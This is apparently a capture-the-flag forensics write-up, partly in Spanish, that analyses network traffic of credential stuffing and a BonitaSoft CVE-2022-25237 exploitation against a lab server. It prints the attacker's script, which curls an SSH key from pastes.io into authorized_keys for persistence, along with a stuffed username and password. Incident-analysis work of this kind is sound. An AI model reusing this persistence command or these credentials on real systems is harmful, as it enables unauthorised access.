# Meerkat
#sherlock
#pcap
#alerts 

We are given a .json and a .pcap


To search the name of the application thats running in the Business Management Platform server we can search inside the json

Here we can find the name is `BonitaSoft`

In the .pcap we can see a lot of HTTP post petitions which have different usernames and passwords so we can be facing `Credential stuffing`

In the first alert that we see the BonitaSoft name we have the corresponding CVE `CVE-2022-25237`

after reading about that CVE we realize the attacker must try to access a certain PATH in the HTTP request, after just 2 POST requests, we can find the special path in the third one `i18ntranslation`

Si aplicamos el siguiente filtro en wireshark podemos ver el número de intentos realizados con diferentes credenciales `http.request.method and http.request.uri contains "loginservice"` un total de 56

El usuario y la contraseña exitosos deben ser los últimos por orden temporal si consultamos el último HTTP POST a ese endpoint encontramos

username: seb.broom@forela.co.uk
password: g0vernm3nt

`seb.broom@forela.co.uk:g0vernm3nt`

we can see that after the attacker enters succesfully the machine via SSH he starts doing queries to a text sharing site called `pastes.io`

a little bit after the first DNS request to pastes.io we can see a HTTP get with some js which has the following command inside `[Path with value: /cmd:bash bx5gcr0et8]`. Now we can search the paste that the attacker used by going to `https://pastes.io/bx5gcr0et8`

The content is 

```
#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart
```

The MD5 is `0dc54416c346584539aa985e9d69a98e`

Inside the previous content we find `https://pastes.io/raw/hffgra4unv` which has the public ssh key used by the attacker
`curl https://pastes.io/raw/hffgra4unv > key`
The key hash is `dbb906628855a433d70025b6692c05e7`

The modified file to win persistence is `/home/ubuntu/.ssh/authorized_keys`

The associated MITTRE to this persistence mechanism is the `T1098.004`